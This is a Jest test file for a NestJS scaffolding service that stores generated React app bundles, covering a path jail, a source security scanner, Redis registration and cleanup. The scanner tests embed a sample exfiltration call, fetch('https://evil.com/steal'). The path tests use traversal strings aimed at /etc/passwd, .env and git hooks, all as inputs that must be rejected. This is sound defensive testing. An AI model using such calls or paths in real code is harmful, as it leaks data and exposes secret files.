import { ForbiddenException } from '@nestjs/common';

// ── Mock SessionsService before importing ────────────────────────────────

jest.mock('../sessions/sessions.service', () => ({
  SessionsService: jest.fn().mockImplementation(() => ({
    remove: jest.fn().mockResolvedValue(true),
  })),
}));

// simple-git is mocked as a safety net (used by GitWorkspaceService internally)
const mockGit = {
  checkIsRepo: jest.fn().mockResolvedValue(true),
  revparse: jest.fn().mockResolvedValue('private-apps'),
  add: jest.fn().mockResolvedValue(undefined),
  commit: jest.fn().mockResolvedValue({ commit: 'abc123' }),
  status: jest.fn().mockResolvedValue({ files: [{ path: 'test' }] }),
  push: jest.fn().mockResolvedValue(undefined),
  checkout: jest.fn().mockResolvedValue(undefined),
  checkoutLocalBranch: jest.fn().mockResolvedValue(undefined),
  init: jest.fn().mockResolvedValue(undefined),
  addConfig: jest.fn().mockResolvedValue(undefined),
  addRemote: jest.fn().mockResolvedValue(undefined),
};

jest.mock('simple-git', () => ({
  __esModule: true,
  default: jest.fn(() => mockGit),
}));

// ── fs/promises mock (used by AppStorageService) ─────────────────────────

jest.mock('fs/promises', () => ({
  mkdir: jest.fn().mockResolvedValue(undefined),
  writeFile: jest.fn().mockResolvedValue(undefined),
  unlink: jest.fn().mockResolvedValue(undefined),
  rm: jest.fn().mockResolvedValue(undefined),
  access: jest.fn().mockRejectedValue(new Error('ENOENT')),
}));

import * as fsMock from 'fs/promises';
const mockedFs = fsMock as jest.Mocked<typeof fsMock>;

import { ScaffoldService } from './scaffold.service';
import { AppStorageService } from './app-storage.service';
import { ValidationService } from './validation.service';
import { REDIS_KEYS } from '@gamma/types';

// ── Shared mock objects ───────────────────────────────────────────────────

const mockConfig = {
  get: (key: string, fallback: string) => {
    const values: Record<string, string> = {
      GAMMA_OS_REPO: '/tmp/test-gamma-os',
      SCAFFOLD_GIT_BRANCH: 'private-apps',
      SCAFFOLD_AUTO_PUSH: 'false',
      SCAFFOLD_PRIVATE_REPO_URL: '',
      GIT_AUTHOR_NAME: 'test-user',
      GIT_AUTHOR_EMAIL: 'test@test.com',
    };
    return values[key] ?? fallback;
  },
};

const mockRedis = {
  hset: jest.fn().mockResolvedValue(1),
  hget: jest.fn().mockResolvedValue(null),
  hdel: jest.fn().mockResolvedValue(1),
  xadd: jest.fn().mockResolvedValue('1-0'),
  keys: jest.fn().mockResolvedValue([]),
  del: jest.fn().mockResolvedValue(0),
};

const mockSessionsService = {
  remove: jest.fn().mockResolvedValue(true),
};

/** GitWorkspaceService mock — prevents any real git I/O during tests */
const mockGitWorkspaceService = {
  commitChanges: jest.fn().mockResolvedValue('abc123'),
  stageAndCommitIfChanged: jest.fn().mockResolvedValue(undefined),
};

// ── Test Suite ───────────────────────────────────────────────────────────

describe('ScaffoldService', () => {
  let service: ScaffoldService;
  let appStorageService: AppStorageService;
  let validationService: ValidationService;

  beforeEach(() => {
    appStorageService = new AppStorageService(mockConfig as any);
    validationService = new ValidationService();
    service = new ScaffoldService(
      appStorageService,
      mockGitWorkspaceService as any,
      validationService,
      mockRedis as any,
      mockSessionsService as any,
    );
    jest.clearAllMocks();
  });

  // ── Path Jail Tests ──────────────────────────────────────────────────

  describe('jailPath', () => {
    it('should resolve a valid relative path', () => {
      const result = service.jailPath('weather/WeatherApp.tsx');
      expect(result).toBe(
        '/tmp/test-gamma-os/apps/gamma-ui/apps/private/weather/WeatherApp.tsx',
      );
    });

    it('should resolve nested paths', () => {
      const result = service.jailPath('weather/assets/weather/icon.png');
      expect(result).toBe(
        '/tmp/test-gamma-os/apps/gamma-ui/apps/private/weather/assets/weather/icon.png',
      );
    });

    it('should resolve bundle directory', () => {
      const result = service.jailPath('weather');
      expect(result).toBe(
        '/tmp/test-gamma-os/apps/gamma-ui/apps/private/weather',
      );
    });

    it('should block traversal with ../..', () => {
      expect(() => service.jailPath('../../src/main.tsx')).toThrow(
        ForbiddenException,
      );
    });

    it('should block traversal to /etc/passwd', () => {
      expect(() => service.jailPath('../../../etc/passwd')).toThrow(
        ForbiddenException,
      );
    });

    it('should block absolute paths', () => {
      expect(() => service.jailPath('/etc/passwd')).toThrow(
        ForbiddenException,
      );
    });

    it('should block traversal to .env', () => {
      expect(() => service.jailPath('../../../.env')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .git/config', () => {
      expect(() => service.jailPath('.git/config')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .git/hooks/pre-commit', () => {
      expect(() => service.jailPath('.git/hooks/pre-commit')).toThrow(
        ForbiddenException,
      );
    });

    it('should block .env files', () => {
      expect(() => service.jailPath('.env')).toThrow(ForbiddenException);
    });

    it('should block .DS_Store', () => {
      expect(() => service.jailPath('.DS_Store')).toThrow(ForbiddenException);
    });

    it('should block nested hidden dirs like assets/.hidden/file', () => {
      expect(() => service.jailPath('assets/.hidden/file.txt')).toThrow(
        ForbiddenException,
      );
    });

    it('should block the "." path (hidden segment)', () => {
      expect(() => service.jailPath('.')).toThrow(ForbiddenException);
    });
  });

  // ── Security Scanner Tests ───────────────────────────────────────────

  describe('validateSource', () => {
    const validComponent = `
      import React from 'react';
      export const WeatherApp: React.FC = () => {
        return <div>Weather</div>;
      };
    `;

    it('should accept a valid React component', () => {
      const result = service.validateSource(validComponent);
      expect(result.ok).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject eval()', () => {
      const code = `import React from 'react';\nexport const X = () => { eval('alert(1)'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('eval()');
    });

    it('should reject innerHTML', () => {
      const code = `import React from 'react';\nexport const X = () => { document.body.innerHTML = '<script>'; return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('innerHTML');
    });

    it('should reject document.write', () => {
      const code = `import React from 'react';\nexport const X = () => { document.write('hack'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('document.write');
    });

    it('should reject localStorage', () => {
      const code = `import React from 'react';\nexport const X = () => { localStorage.setItem('x','y'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('localStorage');
    });

    it('should reject sessionStorage', () => {
      const code = `import React from 'react';\nexport const X = () => { sessionStorage.getItem('x'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('sessionStorage');
    });

    it('should reject child_process require', () => {
      const code = `import React from 'react';\nconst cp = require('child_process');\nexport const X = () => <div/>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('child_process');
    });

    it('should reject process.env', () => {
      const code = `import React from 'react';\nexport const X = () => <div>{process.env.SECRET}</div>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('process.env');
    });

    it('should reject external fetch', () => {
      const code = `import React from 'react';\nexport const X = () => { fetch('https://evil.com/steal'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('External fetch');
    });

    it('should allow fetch to localhost', () => {
      const code = `import React from 'react';\nexport const X = () => { fetch('http://localhost:3001/api'); return <div/>; };`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(true);
    });

    it('should reject code without export', () => {
      const code = `import React from 'react';\nconst X = () => <div/>;`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('export');
    });

    it('should reject code without React reference', () => {
      const code = `export const X = () => {};`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors[0]).toContain('react');
    });

    it('should catch multiple violations at once', () => {
      const code = `eval('x'); document.write('y');`;
      const result = service.validateSource(code);
      expect(result.ok).toBe(false);
      expect(result.errors.length).toBeGreaterThanOrEqual(2);
    });
  });

  // ── Bundle Registry Tests ────────────────────────────────────────────

  describe('scaffold (bundle)', () => {
    beforeEach(() => {
      mockedFs.mkdir.mockClear();
      mockedFs.writeFile.mockClear();
      mockedFs.access.mockReset().mockRejectedValue(new Error('ENOENT'));
    });

    it('should register with bundlePath, hasAgent, and updatedAt', async () => {
      const result = await service.scaffold({
        appId: 'weather',
        displayName: 'Weather',
        sourceCode: `import React from 'react';\nexport const WeatherApp = () => <div/>;`,
        commit: false,
      });

      expect(result.ok).toBe(true);
      expect(result.modulePath).toBe('./apps/gamma-ui/apps/private/weather/WeatherApp');

      const hsetCall = mockRedis.hset.mock.calls[0];
      expect(hsetCall[0]).toBe(REDIS_KEYS.APP_REGISTRY);
      expect(hsetCall[1]).toBe('weather');
      const entry = JSON.parse(hsetCall[2] as string);
      expect(entry.bundlePath).toBe('./apps/gamma-ui/apps/private/weather/');
      expect(entry.hasAgent).toBe(false);
      expect(entry.updatedAt).toBeGreaterThan(0);
      expect(entry.modulePath).toBe('./apps/gamma-ui/apps/private/weather/WeatherApp');
    });

    it('should set hasAgent=true when agentPrompt is provided', async () => {
      // access succeeds — agent-prompt.md exists on disk after write
      mockedFs.access.mockResolvedValue(undefined);

      await service.scaffold({
        appId: 'weather',
        displayName: 'Weather',
        sourceCode: `import React from 'react';\nexport const WeatherApp = () => <div/>;`,
        agentPrompt: 'You are a weather assistant.',
        commit: false,
      });

      const entry = JSON.parse(mockRedis.hset.mock.calls[0][2] as string);
      expect(entry.hasAgent).toBe(true);
    });

    it('should write contextDoc and agentPrompt files when provided', async () => {
      mockedFs.access.mockResolvedValue(undefined);

      await service.scaffold({
        appId: 'weather',
        displayName: 'Weather',
        sourceCode: `import React from 'react';\nexport const WeatherApp = () => <div/>;`,
        contextDoc: '# Weather Context',
        agentPrompt: 'You are a weather agent.',
        commit: false,
      });

      const paths = mockedFs.writeFile.mock.calls.map((c) => c[0] as string);
      expect(paths.some((p) => p.endsWith('WeatherApp.tsx'))).toBe(true);
      expect(paths.some((p) => p.endsWith('context.md'))).toBe(true);
      expect(paths.some((p) => p.endsWith('agent-prompt.md'))).toBe(true);
    });

    it('should NOT write contextDoc/agentPrompt when undefined (PATCH semantics)', async () => {
      await service.scaffold({
        appId: 'weather',
        displayName: 'Weather',
        sourceCode: `import React from 'react';\nexport const WeatherApp = () => <div/>;`,
        commit: false,
      });

      const paths = mockedFs.writeFile.mock.calls.map((c) => c[0] as string);
      expect(paths.some((p) => p.endsWith('context.md'))).toBe(false);
      expect(paths.some((p) => p.endsWith('agent-prompt.md'))).toBe(false);
    });
  });

  // ── Remove Deep Cleanup Tests ────────────────────────────────────────

  describe('remove (deep cleanup)', () => {
    beforeEach(() => {
      mockRedis.keys.mockReset().mockResolvedValue([]);
      mockRedis.del.mockReset().mockResolvedValue(0);
      mockRedis.hdel.mockReset().mockResolvedValue(1);
      mockRedis.xadd.mockReset().mockResolvedValue('1-0');
      mockSessionsService.remove.mockReset().mockResolvedValue(true);
      mockGitWorkspaceService.stageAndCommitIfChanged
        .mockReset()
        .mockResolvedValue(undefined);
      mockedFs.rm.mockReset().mockResolvedValue(undefined);
    });

    it('should delete app-data Redis keys when they exist', async () => {
      const fakeKeys = [
        `${REDIS_KEYS.APP_DATA_PREFIX}weather:selectedCities`,
        `${REDIS_KEYS.APP_DATA_PREFIX}weather:units`,
      ];
      mockRedis.keys.mockResolvedValue(fakeKeys);

      await service.remove('weather');

      expect(mockRedis.keys).toHaveBeenCalledWith(
        `${REDIS_KEYS.APP_DATA_PREFIX}weather:*`,
      );
      expect(mockRedis.del).toHaveBeenCalledWith(...fakeKeys);
    });

    it('should skip redis.del when no app-data keys exist', async () => {
      mockRedis.keys.mockResolvedValue([]);

      await service.remove('weather');

      expect(mockRedis.keys).toHaveBeenCalledWith(
        `${REDIS_KEYS.APP_DATA_PREFIX}weather:*`,
      );
      expect(mockRedis.del).not.toHaveBeenCalled();
    });

    it('should call sessionsService.remove for the App Owner session', async () => {
      await service.remove('weather');

      expect(mockSessionsService.remove).toHaveBeenCalledWith(
        'app-owner-weather',
      );
    });

    it('should not throw if sessionsService.remove fails', async () => {
      mockSessionsService.remove.mockRejectedValue(
        new Error('session not found'),
      );

      await expect(service.remove('weather')).resolves.toEqual({ ok: true });
      expect(mockSessionsService.remove).toHaveBeenCalledWith(
        'app-owner-weather',
      );
    });

    it('should remove bundle directory, registry entry, and broadcast', async () => {
      await service.remove('weather');

      // Bundle dir removal (via AppStorageService → fs.rm)
      expect(mockedFs.rm).toHaveBeenCalledWith(
        expect.stringContaining('weather'),
        { recursive: true, force: true },
      );

      // Registry removal
      expect(mockRedis.hdel).toHaveBeenCalledWith(
        REDIS_KEYS.APP_REGISTRY,
        'weather',
      );

      // SSE broadcast
      expect(mockRedis.xadd).toHaveBeenCalledWith(
        REDIS_KEYS.SSE_BROADCAST,
        '*',
        'type',
        'component_removed',
        'appId',
        'weather',
      );
    });
  });
});
